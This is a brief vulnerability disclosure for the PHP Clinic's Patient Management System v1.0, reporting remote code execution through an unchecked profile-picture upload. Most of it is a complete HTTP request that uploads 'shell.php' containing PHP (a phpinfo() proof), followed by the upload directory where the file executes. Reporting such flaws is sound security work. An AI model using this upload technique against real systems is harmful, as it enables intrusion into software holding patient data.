# Clinic's Patient Management System v1.0 has arbitrary code execution (RCE)

BUG_Author：WangWei

vendor: https://www.sourcecodester.com/php-clinics-patient-management-system-source-code

Vulnerability url: ip/pms/users.php

Request package for file upload：

```sql
POST /pms/users.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/pms/users.php
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=odknb2obdq1nkaqk7p7u8hvli8
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------21071748817745
Content-Length: 639

-----------------------------21071748817745
Content-Disposition: form-data; name="display_name"

1
-----------------------------21071748817745
Content-Disposition: form-data; name="user_name"

2
-----------------------------21071748817745
Content-Disposition: form-data; name="password"

2
-----------------------------21071748817745
Content-Disposition: form-data; name="profile_picture"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------21071748817745
Content-Disposition: form-data; name="save_user"


-----------------------------21071748817745--
```

The files will be uploaded to this directory \pms\user_images

![image](https://user-images.githubusercontent.com/54017627/177025313-dc8bc083-5a55-42c8-be33-431abcdcd60c.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/177025322-787fde64-9b7a-48f4-af76-73902cdfac1e.png)
